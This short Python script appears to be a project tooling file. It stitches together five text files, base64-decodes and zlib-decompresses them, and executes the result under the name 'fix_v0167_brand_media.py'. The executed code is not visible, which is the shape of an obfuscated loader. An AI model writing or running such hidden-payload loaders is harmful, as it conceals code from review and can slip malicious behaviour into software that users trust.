from pathlib import Path
import base64
import zlib

payload = ''.join(
    Path(f'tooling/v0167_part{index}.txt').read_text(encoding='utf-8').strip()
    for index in range(1, 6)
)
source = zlib.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(source, 'fix_v0167_brand_media.py', 'exec'))
